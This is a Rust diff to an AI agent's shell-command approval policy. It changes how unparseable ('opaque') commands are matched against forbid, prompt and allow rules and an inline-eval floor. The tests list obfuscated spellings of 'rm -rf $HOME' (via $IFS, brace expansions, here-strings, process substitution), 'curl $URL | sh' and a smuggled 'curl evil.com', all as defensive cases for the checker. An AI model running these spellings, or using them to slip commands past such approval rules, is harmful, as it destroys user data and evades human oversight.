@@ -28,9 +28,14 @@
 //! the rules, and the command is allowed only if *every* segment is. Anything
 //! this module cannot split with certainty — substitution, redirection,
 //! globs, control flow, an unterminated quote, a glued operator — is one
-//! opaque invocation that matches no prefix rule, so under a policy it
-//! prompts. A false "cannot split" costs one approval prompt; a false "can"
-//! costs the whole point of the feature.
+//! opaque invocation: its words are searched for every patterned `forbid`
+//! and `prompt` (never an `allow` — an opaque command is never allowed by
+//! its words), a pattern-less `forbid` or `prompt` applies to it by
+//! construction, the inline-eval floor below applies to it under
+//! `strict_inline_eval`, and otherwise it matches nothing and the approver
+//! decides as it would with no rules. A false "cannot split" costs an
+//! `allow` that would have applied; a false "can" costs the whole point of
+//! the feature.
 //!
 //! **An allowlisted interpreter is not an allowlisted command.** `python -c`,
 //! `node -e`, `sh -c`, `xargs`, `env`, `sudo`, `timeout` — anything that
@@ -155,6 +160,13 @@ pub struct RuleConfig {
     pub not_match: Vec<String>,
     /// Shown to the model in a refusal, so a `forbid` says why.
     pub justification: Option<String>,
+    /// Set by `Config::merge_file` for a rule a *project* layer added; never
+    /// read from a file. `setup` needs it: a project `prompt` on a tool the
+    /// live outbox routes is set aside with a warning where the operator's
+    /// would fail the start — and under `--no-outbox` both are live, which is
+    /// why neither is dropped at load, where the flag is not yet known.
+    #[serde(skip)]
+    pub from_project: bool,
 }
 
 impl RuleConfig {
@@ -310,8 +322,9 @@ impl ExecPolicy {
             for ex in &rule.examples {
                 match segments_of(ex) {
                     None => anyhow::bail!(
-                        "{name}: `match` example {ex:?} cannot be split safely, so it would \
-                         always prompt; pick a plain example"
+                        "{name}: `match` example {ex:?} cannot be split safely, so an `allow` \
+                         would never match it and a `forbid` or `prompt` only by its words; \
+                         pick a plain example"
                     ),
                     Some(segs) => {
                         if let Some(seg) = segs.iter().find(|s| !rule.matches(s)) {
@@ -436,29 +449,76 @@ impl ExecPolicy {
             {
                 return Some(self.ruling(tool, RuleDecision::Forbid, &rules, None));
             }
-            // And a *patterned* `forbid` is looked for anyway, over-
-            // approximately: the raw words of the command, split on
-            // whitespace with no quote handling, and the pattern matched at
-            // every position rather than only at a segment head. `rm -rf
-            // $HOME`, `rm -rf *`, `git status; rm -rf {a,b}` all carry the
-            // forbidden words in plain sight; refusing them costs nothing the
-            // opaque prompt was not already costing, and a false forbid is a
-            // refusal, not a hole. The PR review found the pattern-less case
-            // fixed and this one — the PR's own headline example — not.
-            if let Some(seg) = forbidden_words(&rules, command) {
-                return Some(self.ruling(tool, RuleDecision::Forbid, &rules, Some(&seg)));
+            // A *patterned* `forbid` or `prompt` is looked for by its words,
+            // over-approximately: the command cut into best-effort segments
+            // (`opaque_segments` — separators, redirections removed whole,
+            // quotes and backslashes dropped, leading keywords and
+            // assignments skipped) and the pattern matched at every position
+            // rather than only at a segment head. `rm -rf $HOME`, `rm -rf *`,
+            // `git status; rm -rf {a,b}` carry the forbidden words in plain
+            // sight, and `git push origin main > /dev/null` the words a
+            // `prompt` on `["git", "push"]` names; a false forbid or prompt
+            // costs a prompt, not a hole. The PR reviews found the
+            // pattern-less case fixed and the patterned `forbid` not, then
+            // the patterned `prompt` not, one pass each.
+            let by_words = narrowing_words(&rules, command);
+            if let Some((RuleDecision::Forbid, seg)) = &by_words {
+                return Some(self.ruling(tool, RuleDecision::Forbid, &rules, Some(seg)));
             }
-            // Otherwise a policy exists for this tool and the command cannot
-            // be judged: ask. Not `None` — under `Allow` mode that would run
-            // the one shape the splitter refused to vouch for.
-            return Some(Ruling {
-                decision: RuleDecision::Prompt,
-                reason: format!(
-                    "`{tool}` has approval rules and this command cannot be split safely \
-                     (substitution, redirection, a glob or control flow), so it is judged as \
-                     one opaque invocation and asked about"
-                ),
-            });
+            // A pattern-less `prompt` applies to every call by construction,
+            // opaque or not.
+            if rules
+                .iter()
+                .any(|r| r.pattern.is_empty() && r.decision == RuleDecision::Prompt)
+            {
+                return Some(self.ruling(tool, RuleDecision::Prompt, &rules, None));
+            }
+            if let Some((RuleDecision::Prompt, seg)) = &by_words {
+                return Some(self.ruling(tool, RuleDecision::Prompt, &rules, Some(seg)));
+            }
+            // The inline-eval floor applies to an opaque command as it does
+            // to a splittable one: the words are cut at the shell's separators
+            // into best-effort segments and each head is asked whether it
+            // runs its arguments. Without this, `python3 -c 'import os' >
+            // /tmp/x` fell through where `python3 -c 'import os'` was
+            // consulted — a redirect made an interpreter *less* restricted
+            // (PR #148's review). Over-approximate like `narrowing_words`,
+            // and only at segment heads, so `ls *.txt | grep make` is not a
+            // wrapper because a wrapper's name appears in it.
+            if self.strict_inline_eval
+                && opaque_segments(command).iter().any(|seg| {
+                    runs_its_arguments(seg)
+                        // A head the shell will expand is a program this
+                        // module cannot read — `$PY -c 'x'`, `py* -c 'x'` —
+                        // and unknown is never clean. Heads only, so `ls
+                        // *.txt` is untouched (PR #148's review).
+                        || seg[0].contains(['$', '*', '?', '[', EXPANSION])
+                        // A here-string feeds the head a program from the
+                        // command line, which is `-c` by another spelling.
+                        || seg.iter().any(|w| w == "<<<")
+                })
+            {
+                return Some(Ruling {
+                    decision: RuleDecision::Prompt,
+                    reason: format!(
+                        "this `{tool}` command runs code or another command from its \
+                         arguments and cannot be split safely, so it is asked about; an \
+                         allowlisted interpreter is not an allowlisted command"
+                    ),
+                });
+            }
+            // Otherwise the command matched no rule, and the approver decides
+            // as it would with no rules at all — the same answer an unmatched
+            // *splittable* command gets. The first version returned `Prompt`
+            // here so that `Allow` mode could not run a shape the splitter
+            // would not vouch for; once `forbidden_words` searched the opaque
+            // command for every `forbid`, what that prompt still bought was a
+            // cliff: with `consult` failing closed, one `forbid` on `rm -rf`
+            // made every `ls *.txt` in a trigger `Blocked` where it ran the
+            // day before, on the surface least likely to notice. The owner
+            // ruled for the fall-through on 2026-09-03. Interactively nothing
+            // changes — an `Ask` approver asks about an unruled write anyway.
+            return None;
         };
 
         let mut all_allow = true;
@@ -502,9 +562,10 @@ impl ExecPolicy {
                 let opaque_inner = segment[1..]
                     .iter()
                     .filter(|arg| arg.contains(char::is_whitespace) && segments_of(arg).is_none())
-                    .any(|arg| forbidden_words(&rules, arg).is_some());
-                if opaque_inner {
-                    decision = Some(RuleDecision::Forbid);
+                    .filter_map(|arg| narrowing_words(&rules, arg).map(|(d, _)| d))
+                    .max();
+                if let Some(d) = opaque_inner {
+                    decision = Some(decision.map_or(d, |c| c.max(d)));
                 }
                 // Under the strict check, never below Prompt: an allowlisted
                 // interpreter is not an allowlisted command.
@@ -699,42 +760,269 @@ fn tokenize(command: &str) -> Option<Vec<Tok>> {
     Some(out)
 }
 
-/// A patterned `forbid`'s words, found in a command the splitter refused to
-/// take apart. Split on whitespace and the shell's separators with quote
-/// characters dropped, matched at every position, first token of the match
-/// reduced to its basename.
-/// Over-approximate by design: this runs only where the answer would
-/// otherwise be a prompt, and a false forbid is a refusal, not a hole.
-fn forbidden_words(rules: &[&RuleConfig], command: &str) -> Option<Vec<String>> {
-    // Quote characters are dropped from every word, not honoured: `"rm" -rf
-    // $HOME` and `sh -c 'rm -rf /*'` carry the forbidden words as plainly as
-    // the bare spelling does, and the PR review found them coming back as a
-    // prompt — which on a headless `Allow` surface is a yes. And the shell's
-    // own separators split a word the way whitespace does: `git status;rm
-    // -rf *` is `git status; rm -rf *` to bash, one character apart, and the
-    // review found the glued spelling walking past this check next — and
-    // then the backtick, the one substitution spelling `(`/`)` did not cover.
-    let words: Vec<String> = command
-        .split(|c: char| {
-            c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`' | '<' | '>')
+/// Best-effort segments of a command the splitter refused to take apart:
+/// cut at the shell's separators and substitution characters, each piece
+/// whitespace-split with quote characters dropped and leading `NAME=value`
+/// assignments removed. Over-approximate by design — this runs only where
+/// the exact splitter has already given up — and used for the two checks
+/// that must reach into an opaque command anyway: a `forbid`'s words and the
+/// inline-eval floor.
+fn opaque_segments(command: &str) -> Vec<Vec<String>> {
+    // Words that precede a command without being one: a brace group's
+    // delimiters, control flow, negation, `time`. Dropped from a piece's
+    // head so `{ python3 -c x; }` and `do python3 -c x` show `python3` as
+    // the head — PR #148's review found a brace or a `do` making an
+    // interpreter less restricted, exactly as the redirect had. The cost,
+    // stated: a rule whose *first* pattern word is one of these (`time` is
+    // a real binary at `/usr/bin/time`) is invisible on an opaque command.
+    const NOT_A_COMMAND: &[&str] = &[
+        "{", "}", "!", "if", "then", "else", "elif", "fi", "for", "while", "until", "do", "done",
+        "case", "esac", "in", "select", "time", "coproc", "function",
+    ];
+    // Redirections go first, over the whole command: `2>&1` holds a `&` that
+    // the separator split below would otherwise cut, leaving `1` as a head.
+    // `$IFS` is whitespace spelled out, and it is replaced before the split
+    // because the brace form `${IFS}` would otherwise be torn by the `{`/`}`
+    // separators into `$` and `IFS` (`rm${IFS}-rf${IFS}$HOME`). `$'…'` and
+    // `$"…"` are quoting, not expansion — `rm -r$'f'` is `rm -rf` — so the
+    // `$` goes and the quote removal below does the rest. Every other
+    // `${…}` becomes one placeholder character before the brace split, so
+    // `-${a}rf` survives as one word the expansion-free view can read as
+    // `-rf` (PR #148's review found the glued spelling reaching `None`).
+    let stripped = mask_braced_expansions(
+        &strip_redirects(command)
+            .replace("${IFS}", " ")
+            .replace("$IFS", " ")
+            .replace("$'", "'")
+            .replace("$\"", "\""),
+    );
+    stripped
+        .split([';', '|', '&', '(', ')', '{', '}', '`', '\n'])
+        .map(|piece| {
+            piece
+                .split_whitespace()
+                .map(|w| {
+                    // `\python3` is `python3` to the shell (a backslash only
+                    // defeats alias lookup) and is opaque to the splitter.
+                    w.chars()
+                        .filter(|c| !matches!(c, '\'' | '"' | '\\'))
+                        .collect::<String>()
+                })
+                // An expansion glued to a word is its own word — `-rf$HOME`
+                // is `-rf` and `$HOME` — and `$IFS` is whitespace spelled
+                // out, so `rm$IFS-rf$IFS$HOME` is `rm -rf $HOME`. Without
+                // this the glued spelling walked past `narrowing_words`
+                // (PR #148's review) and the fall-through ran it.
+                .flat_map(split_expansions)
+                .filter(|w| !w.is_empty() && w != "$IFS" && w != "${IFS}")
+                .skip_while(|w| {
+                    NOT_A_COMMAND.contains(&w.as_str())
+                        || (!w.starts_with('-')
+                            && w.split_once('=').is_some_and(|(name, _)| {
+                                !name.is_empty()
+                                    && name.chars().all(|c| c.is_alphanumeric() || c == '_')
+                            }))
+                })
+                .collect::<Vec<_>>()
         })
-        .map(|w| {
-            w.chars()
-                .filter(|c| !matches!(c, '\'' | '"'))
-                .collect::<String>()
-        })
-        .filter(|w| !w.is_empty())
-        .collect();
-    for start in 0..words.len() {
-        let tail = &words[start..];
-        if rules
-            .iter()
-            .any(|r| r.decision == RuleDecision::Forbid && !r.pattern.is_empty() && r.matches(tail))
-        {
-            return Some(tail.to_vec());
+        .filter(|seg| !seg.is_empty())
+        .collect()
+}
+
+/// Stands in for a `${…}` expansion in the opaque views: not a separator, not
+/// a word character, removed by [`expansion_free`], and read by the floor as
+/// "a head the shell will expand".
+const EXPANSION: char = '\u{E000}';
+
+/// Every `${…}` replaced by [`EXPANSION`], so the brace split that follows
+/// does not tear it. An unterminated `${` is left alone.
+fn mask_braced_expansions(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut rest = s;
+    while let Some(i) = rest.find("${") {
+        out.push_str(&rest[..i]);
+        match rest[i + 2..].find('}') {
+            Some(j) => {
+                out.push(EXPANSION);
+                rest = &rest[i + 2 + j + 1..];
+            }
+            None => {
+                out.push_str(&rest[i..]);
+                rest = "";
+            }
         }
     }
-    None
+    out.push_str(rest);
+    out
+}
+
+/// A segment with every expansion removed: `$name` runs and [`EXPANSION`]
+/// placeholders deleted from each word, empty words dropped. `-${a}rf` is
+/// `-rf`, `rm$X -rf` is `rm -rf`. The word search tries this view beside the
+/// literal one, because an expansion glued *inside* a pattern word is the
+/// one spelling the literal view cannot match.
+fn expansion_free(seg: &[String]) -> Vec<String> {
+    seg.iter()
+        .map(|w| {
+            let mut out = String::with_capacity(w.len());
+            let mut chars = w.chars().peekable();
+            while let Some(c) = chars.next() {
+                if c == EXPANSION {
+                    continue;
+                }
+                if c == '$' {
+                    while chars
+                        .peek()
+                        .is_some_and(|n| n.is_alphanumeric() || *n == '_')
+                    {
+                        chars.next();
+                    }
+                    continue;
+                }
+                out.push(c);
+            }
+            out
+        })
+        .filter(|w| !w.is_empty())
+        .collect()
+}
+
+/// A word cut at every interior `$`, the leading one kept attached: `-rf$IFS$HOME`
+/// is `-rf`, `$IFS`, `$HOME`; `$PY` stays `$PY`, so the floor's "a head the
+/// shell will expand" test still sees it.
+fn split_expansions(word: String) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut current = String::new();
+    for (i, c) in word.chars().enumerate() {
+        if c == '$' && i > 0 && !current.is_empty() {
+            out.push(std::mem::take(&mut current));
+        }
+        current.push(c);
+    }
+    out.push(current);
+    out
+}
+
+/// A command with every redirection removed — the operator *and* its
+/// target, as one span: `> out`, `>out`, `2>/dev/null`, `2>&1`, `&>log`,
+/// `< list`. Splitting on `<`/`>` alone left the target standing as the
+/// next word, so `> out python3 -c 'import os'` headed on `out` and the
+/// floor never saw the interpreter (PR #148's review). A target ends at
+/// whitespace or at a separator, so the command glued to it or substituted
+/// into it stays visible to the split that follows. Over-approximate: a
+/// word glued to the operator is taken as its target whatever it was.
+fn strip_redirects(piece: &str) -> String {
+    let cs: Vec<char> = piece.chars().collect();
+    let mut out = String::with_capacity(piece.len());
+    let mut i = 0;
+    while i < cs.len() {
+        if cs[i] != '<' && cs[i] != '>' {
+            out.push(cs[i]);
+            i += 1;
+            continue;
+        }
+        // The file descriptor glued in front (`2>`) — only when the digits
+        // are a whole word, so `python3>out` keeps its `3` — and the `&` of
+        // `&>`.
+        let digits = out.chars().rev().take_while(|c| c.is_ascii_digit()).count();
+        let whole_word = out[..out.len() - digits]
+            .chars()
+            .next_back()
+            .is_none_or(char::is_whitespace);
+        if digits > 0 && whole_word {
+            out.truncate(out.len() - digits);
+        }
+        if out.ends_with('&') {
+            out.pop();
+        }
+        let run_start = i;
+        while i < cs.len() && (cs[i] == '<' || cs[i] == '>') {
+            i += 1;
+        }
+        // A here-string's operand is not a file name but a payload the shell
+        // hands the program on stdin: `bash <<< 'rm -rf $HOME'` *runs* `rm
+        // -rf $HOME`. Eating it as a target hid the words from
+        // `narrowing_words` and the floor alike (PR #148's review). The
+        // operator is kept as a word of its own, so the payload stays in the
+        // segment for the word search and the floor can see that the head
+        // was fed a program.
+        if i - run_start == 3 && cs[run_start] == '<' {
+            out.push_str(" <<< ");
+            continue;
+        }
+        // A target ends at whitespace *or* at any character the separator
+        // split below would cut on: `> out;rm -rf $HOME` glues the next
+        // command to the target, and `> $(rm -rf $HOME)`, `<(rm -rf $HOME)`,
+        // `>(…)` make the target a substitution whose inner command must
+        // stay visible. Scanning to whitespace alone swallowed all of them,
+        // and five spellings `forbidden_words` had caught went to `None`
+        // (PR #148's review).
+        let ends_target = |c: char| {
+            c.is_whitespace()
+                || matches!(c, ';' | '|' | '&' | '(' | ')' | '{' | '}' | '`' | '<' | '>')
+        };
+        if i < cs.len()
+            && cs[i] == '&'
+            && cs
+                .get(i + 1)
+                .is_some_and(|c| c.is_ascii_digit() || *c == '-')
+        {
+            // `>&1`, `>&-`: the target is a descriptor, not a word.
+            i += 1;
+            while i < cs.len() && (cs[i].is_ascii_digit() || cs[i] == '-') {
+                i += 1;
+            }
+        } else {
+            if i < cs.len() && cs[i] == '&' {
+                // `>& word`, the other spelling of `&> word`.
+                i += 1;
+            }
+            while i < cs.len() && cs[i].is_whitespace() {
+                i += 1;
+            }
+            while i < cs.len() && !ends_target(cs[i]) {
+                i += 1;
+            }
+        }
+        out.push(' ');
+    }
+    out
+}
+
+/// The strongest *narrowing* rule — `prompt` or `forbid` — whose words appear
+/// in a command the splitter refused to take apart, with the words that
+/// matched. Over the best-effort segments of [`opaque_segments`], matched at
+/// every position rather than only at a head, first token of the match
+/// reduced to its basename. Over-approximate by design: this runs only where
+/// the answer would otherwise fall through, and a false prompt or forbid
+/// costs a prompt where a false allow is the hole. `allow` rules are never
+/// consulted here — an opaque command is never allowed by its words.
+fn narrowing_words(rules: &[&RuleConfig], command: &str) -> Option<(RuleDecision, Vec<String>)> {
+    let mut best: Option<(RuleDecision, Vec<String>)> = None;
+    let literal = opaque_segments(command);
+    let views = literal
+        .iter()
+        .flat_map(|seg| [seg.clone(), expansion_free(seg)]);
+    for seg in views {
+        for start in 0..seg.len() {
+            let tail = &seg[start..];
+            let hit = rules
+                .iter()
+                .filter(|r| r.decision != RuleDecision::Allow && !r.pattern.is_empty())
+                .filter(|r| r.matches(tail))
+                .map(|r| r.decision)
+                .max();
+            if let Some(d) = hit {
+                if best.as_ref().is_none_or(|(b, _)| d > *b) {
+                    best = Some((d, tail.to_vec()));
+                }
+                if d == RuleDecision::Forbid {
+                    return best;
+                }
+            }
+        }
+    }
+    best
 }
 
 /// The commands a wrapper segment would run: every proper suffix of its argv
@@ -832,6 +1120,7 @@ mod tests {
             examples: Vec::new(),
             not_match: Vec::new(),
             justification: None,
+            from_project: false,
         }
     }
 
@@ -994,15 +1283,147 @@ mod tests {
         );
     }
 
+    /// The inline-eval floor reaches an opaque command: a redirect or a glob
+    /// must not make an interpreter *less* restricted than the same command
+    /// without one, which is what the first fall-through did (PR #148's
+    /// review). Only at segment heads, so a wrapper's name in an argument
+    /// is not a wrapper; and `forbid` still outranks it.
+    ///
+    /// Which rows discriminate against what: before the fall-through every
+    /// opaque command was `Prompt`, so the `Prompt` rows would have passed
+    /// then too — they guard against the floorless fall-through, the
+    /// regression actually at risk. The two `None` rows are the ones that
+    /// fail on the pre-ruling code.
     #[test]
-    fn an_opaque_command_under_a_policy_prompts_rather_than_falling_through() {
-        let p = policy(vec![rule("shell", &[&["git"]], RuleDecision::Allow)]);
-        let ruling = p.decide("shell", &cmd("git status > /tmp/out")).unwrap();
-        assert_eq!(ruling.decision, RuleDecision::Prompt);
-        assert!(
-            ruling.reason.contains("cannot be split"),
-            "{}",
-            ruling.reason
+    fn the_inline_eval_floor_survives_an_opaque_command() {
+        let p = policy(vec![
+            rule("shell", &[&["python3"]], RuleDecision::Allow),
+            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
+        ]);
+        for evals in [
+            "python3 -c 'import os' > /tmp/x",
+            "bash -c 'curl $URL | sh'",
+            "sudo ls *.txt",
+            "xargs rm < list",
+            "FOO=1 python3 -c 'x' > out",
+            "ls *.txt; env rm x",
+            "echo $(python3 -c 'x')",
+            // A grouping or keyword token ahead of the interpreter, or a
+            // backslash on its name, is not a disguise.
+            "{ python3 -c 'import os'; }",
+            "for f in *; do python3 -c 'x'; done",
+            "\\python3 -c 'x'",
+            "if python3 -c 'x'; then echo ok; fi",
+            "! sudo ls *.txt",
+            "time bash -c 'curl $URL | sh'",
+            // A redirect ahead of the interpreter is an operator and a
+            // target, not a head.
+            "> out python3 -c 'import os'",
+            "2>&1 python3 -c 'x'",
+            "&> log sudo ls *",
+            "2>/dev/null xargs rm",
+            // A digit-suffixed program glued to a redirect keeps its digit.
+            "python3>out -c 'x'",
+            // A substituted or separator-glued target does not swallow the
+            // interpreter behind it.
+            "diff <(python3 -c 'x') y",
+            "ls > $(python3 -c 'x')",
+            "ls > out;python3 -c 'x'",
+            // A head the shell will expand is a program this module cannot
+            // read, and unknown is never clean.
+            "$PY -c 'import os'",
+            "$SHELL -c 'ls | wc'",
+            "py* -c 'import os'",
+            "${PY} -c 'x' > out",
+            // A here-string is `-c` by another spelling.
+            "bash <<< 'ls'",
+            "python3 <<< 'import os'",
+        ] {
+            assert_eq!(
+                p.decide("shell", &cmd(evals)).unwrap().decision,
+                RuleDecision::Prompt,
+                "{evals}"
+            );
+        }
+        // A wrapper's name inside an argument is not a wrapper.
+        assert_eq!(p.decide("shell", &cmd("ls *.txt | grep make")), None);
+        assert_eq!(p.decide("shell", &cmd("echo sudo > note")), None);
+        // `forbid` outranks the floor.
+        assert_eq!(
+            p.decide("shell", &cmd("sudo rm -rf $HOME"))
+                .unwrap()
+                .decision,
+            RuleDecision::Forbid
+        );
+        // With the strict check off, the floor is off here too.
+        let loose = ExecPolicy {
+            rules: vec![rule("shell", &[&["python3"]], RuleDecision::Allow)],
+            strict_inline_eval: false,
+        };
+        assert_eq!(
+            loose.decide("shell", &cmd("python3 -c 'import os' > /tmp/x")),
+            None
+        );
+    }
+
+    /// A patterned `prompt` reaches an opaque command by its words, as a
+    /// `forbid` does: `git push origin main > /dev/null` must not run under
+    /// `--yes` where `git push origin main` is consulted. `forbid` still wins
+    /// where both appear, and the words never *allow* anything.
+    #[test]
+    fn a_patterned_prompt_reaches_an_opaque_command_by_its_words() {
+        let p = policy(vec![
+            rule("shell", &[&["git"], &["push"]], RuleDecision::Prompt),
+            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
+            rule("shell", &[&["ls"]], RuleDecision::Allow),
+        ]);
+        for pushed in [
+            "git push origin main > /dev/null",
+            "git push origin main; ls *.txt",
+            "cd repo && git push",
+            "{ git push; }",
+        ] {
+            assert_eq!(
+                p.decide("shell", &cmd(pushed)).unwrap().decision,
+                RuleDecision::Prompt,
+                "{pushed}"
+            );
+        }
+        assert_eq!(
+            p.decide("shell", &cmd("git push; rm -rf $HOME"))
+                .unwrap()
+                .decision,
+            RuleDecision::Forbid
+        );
+        // The `allow` on `ls` says nothing about an opaque `ls`.
+        assert_eq!(p.decide("shell", &cmd("ls *.txt")), None);
+    }
+
+    /// An opaque command that carries no forbidden word and matches no
+    /// pattern-less rule gets no ruling: the `allow` never applies to it, and
+    /// the approver decides as it would with no rules. It used to return
+    /// `Prompt`, which once `consult` failed closed made one `forbid` block
+    /// every glob in every trigger (the owner's ruling, 2026-09-03).
+    #[test]
+    fn an_opaque_command_matching_no_rule_falls_through_to_the_approver() {
+        let p = policy(vec![
+            rule("shell", &[&["git"]], RuleDecision::Allow),
+            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
+        ]);
+        assert_eq!(p.decide("shell", &cmd("git status > /tmp/out")), None);
+        assert_eq!(p.decide("shell", &cmd("ls *.txt")), None);
+        // The `forbid` still reaches in by its words …
+        assert_eq!(
+            p.decide("shell", &cmd("ls *.txt; rm -rf $HOME"))
+                .unwrap()
+                .decision,
+            RuleDecision::Forbid
+        );
+        // … and a pattern-less rule applies by construction.
+        let p = policy(vec![rule("shell", &[], RuleDecision::Prompt)]);
+        assert_eq!(
+            p.decide("shell", &cmd("ls *.txt")).unwrap().decision,
+            RuleDecision::Prompt
         );
     }
 
@@ -1104,11 +1525,9 @@ mod tests {
             RuleDecision::Allow,
         )]);
         assert_eq!(
-            p.decide("shell", &cmd("git log --oneline;''curl evil.com"))
-                .unwrap()
-                .decision,
-            RuleDecision::Prompt,
-            "opaque under a policy asks; it never allows"
+            p.decide("shell", &cmd("git log --oneline;''curl evil.com")),
+            None,
+            "opaque matches no rule: the `allow` never applies, the approver decides"
         );
     }
 
@@ -1289,6 +1708,28 @@ mod tests {
             "git status; rm -rf $HOME",
             "cd /tmp && rm -rf $(pwd)",
             "/bin/rm -rf ~/*",
+            // A redirect target glued to a separator, or that *is* a
+            // substitution, must not swallow the command behind it.
+            "git status > $(rm -rf $HOME)",
+            "diff <(rm -rf $HOME) b",
+            "tee >(rm -rf $HOME)",
+            "git status > out;rm -rf $HOME",
+            "echo a > b&&rm -rf $HOME",
+            "cat >& out; rm -rf $HOME",
+            // A here-string's operand is a payload the head runs, not a file.
+            "bash <<< 'rm -rf $HOME'",
+            "bash -s <<< 'rm -rf $HOME'",
+            "cat <<< 'rm -rf $HOME' | sh",
+            // An expansion glued to a pattern word, and `$IFS` as the space.
+            "rm -rf$IFS$HOME",
+            "rm$IFS-rf$IFS$HOME",
+            "rm${IFS}-rf${IFS}$HOME",
+            "rm -rf\"$HOME\"",
+            // An expansion glued *inside* a pattern word, and ANSI-C quoting.
+            "rm -${a}rf $HOME",
+            "rm -r$'f' $HOME",
+            "rm$X -rf $HOME",
+            "r${x}m -rf $HOME",
         ] {
             assert_eq!(
                 p.decide("shell", &cmd(opaque)).unwrap().decision,
@@ -1296,13 +1737,11 @@ mod tests {
                 "{opaque}"
             );
         }
-        // An opaque command with none of the forbidden words still prompts.
-        assert_eq!(
-            p.decide("shell", &cmd("git status > out"))
-                .unwrap()
-                .decision,
-            RuleDecision::Prompt
-        );
+        // An opaque command with none of the forbidden words matches no
+        // rule: the approver decides, as for any unmatched command. Not
+        // `Prompt` — that was a cliff on headless surfaces once `consult`
+        // failed closed (one `forbid` blocked every glob in every trigger).
+        assert_eq!(p.decide("shell", &cmd("git status > out")), None);
     }
 
     /// Turning the inline-eval strictness off does not switch off the wrapper
@@ -1360,7 +1799,8 @@ mod tests {
                 "{opaque}"
             );
         }
-        // A tool-level prompt on an opaque command still prompts.
+        // A tool-level prompt applies to every call by construction, so an
+        // opaque command under one still prompts.
         let p = policy(vec![rule("shell", &[], RuleDecision::Prompt)]);
         assert_eq!(
             p.decide("shell", &cmd("ls > out")).unwrap().decision,
